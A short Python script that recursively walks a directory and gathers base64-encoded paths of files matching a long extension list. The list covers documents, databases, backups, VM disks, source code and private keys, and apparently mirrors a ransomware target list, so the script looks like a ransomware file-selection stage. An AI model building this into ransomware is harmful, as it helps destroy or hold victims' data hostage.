import os
import base64

# return the base64 encoded path of the files
def find_files(path):
    file_format = {'.DOC': 0, '.DOCX': 0, '.XLS': 0, '.XLSX': 0, '.PPT': 0, '.PPTX': 0, '.PST': 0, '.OST': 0, '.MSG': 0, '.EML': 0, '.VSD\
': 0, '.VSDX': 0, '.TXT': 0, '.CSV': 0, '.RTF': 0, '.WKS': 0, '.WK1': 0, '.PDF': 0, '.DWG': 0, '.ONETOC2': 0, '.SNT': 0
, '.JPEG': 0, '.JPG': 0, '.DOCB': 0, '.DOCM': 0, '.DOT': 0, '.DOTM': 0, '.DOTX': 0, '.XLSM': 0, '.XLSB': 0, '.XLW': 0, 
'.XLT': 0, '.XLM': 0, '.XLC': 0, '.XLTX': 0, '.XLTM': 0, '.PPTM': 0, '.POT': 0, '.PPS': 0, '.PPSM': 0, '.PPSX': 0, '.PP\
AM': 0, '.POTX': 0, '.POTM': 0, '.EDB': 0, '.HWP': 0, '.602': 0, '.SXI': 0, '.STI': 0, '.SLDX': 0, '.SLDM': 0, '.VDI': 
0, '.VMDK': 0, '.VMX': 0, '.GPG': 0, '.AES': 0, '.ARC': 0, '.PAQ': 0, '.BZ2': 0, '.TBK': 0, '.BAK': 0, '.TAR': 0, '.TGZ\
': 0, '.GZ': 0, '.7Z': 0, '.RAR': 0, '.ZIP': 0, '.BACKUP': 0, '.ISO': 0, '.VCD': 0, '.BMP': 0, '.PNG': 0, '.GIF': 0, '.\
RAW': 0, '.CGM': 0, '.TIF': 0, '.TIFF': 0, '.NEF': 0, '.PSD': 0, '.AI': 0, '.SVG': 0, '.DJVU': 0, '.M4U': 0, '.M3U': 0,
 '.MID': 0, '.WMA': 0, '.FLV': 0, '.3G2': 0, '.MKV': 0, '.3GP': 0, '.MP4': 0, '.MOV': 0, '.AVI': 0, '.ASF': 0, '.MPEG':
 0, '.VOB': 0, '.MPG': 0, '.WMV': 0, '.FLA': 0, '.SWF': 0, '.WAV': 0, '.MP3': 0, '.SH': 0, '.CLASS': 0, '.JAR': 0, '.JA\
VA': 0, '.RB': 0, '.ASP': 0, '.PHP': 0, '.JSP': 0, '.BRD': 0, '.SCH': 0, '.DCH': 0, '.DIP': 0, '.PL': 0, '.VB': 0, '.VB\
S': 0, '.PS1': 0, '.BAT': 0, '.CMD': 0, '.JS': 0, '.ASM': 0, '.H': 0, '.PAS': 0, '.CPP': 0, '.C': 0, '.CS': 0, '.SUO': 
0, '.SLN': 0, '.LDF': 0, '.MDF': 0, '.IBD': 0, '.MYI': 0, '.MYD': 0, '.FRM': 0, '.ODB': 0, '.DBF': 0, '.DB': 0, '.MDB':
 0, '.ACCDB': 0, '.SQL': 0, '.SQLITEDB': 0, '.SQLITE3': 0, '.ASC': 0, '.LAY6': 0, '.LAY': 0, '.MML': 0, '.SXM': 0, '.OT\
G': 0, '.ODG': 0, '.UOP': 0, '.STD': 0, '.SXD': 0, '.OTP': 0, '.ODP': 0, '.WB2': 0, '.SLK': 0, '.DIF': 0, '.STC': 0, '.\
SXC': 0, '.OTS': 0, '.ODS': 0, '.3DM': 0, '.MAX': 0, '.3DS': 0, '.UOT': 0, '.STW': 0, '.SXW': 0, '.OTT': 0, '.ODT': 0, 
'.PEM': 0, '.P12': 0, '.CSR': 0, '.CRT': 0, '.KEY': 0, '.PFX': 0, '.DER': 0}
    
    f = []
    for actual_path, directories, files_found in os.walk(path):
        for arq in files_found:
            extensao = os.path.splitext(os.path.join(actual_path, arq))[1].upper()
            if(file_format.get(extensao) == 0 or extensao == ''):
                f.append(base64.b64encode(os.path.join(actual_path, arq).encode()))
    return f

if __name__  == "__main__":
    for x in find_files('/home/tarcisio/teste'):
        print(x)